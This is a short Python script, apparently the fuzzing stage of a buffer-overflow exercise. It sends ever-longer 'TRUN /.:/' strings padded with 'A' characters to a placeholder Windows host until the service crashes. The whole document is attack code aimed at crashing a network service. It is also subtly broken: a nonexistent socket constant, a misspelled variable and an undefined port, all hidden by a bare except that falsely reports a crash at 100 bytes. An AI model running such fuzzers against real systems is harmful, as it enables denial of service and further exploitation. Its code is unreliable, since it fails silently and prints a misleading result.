#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM)
        s.connect(('windows-machine-ip',port))
        paylaod = "TRUN /.:/" + buffer
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print("fuzzing crashed at %s bytes" %str(len(buffer)))
        sys.exit()
        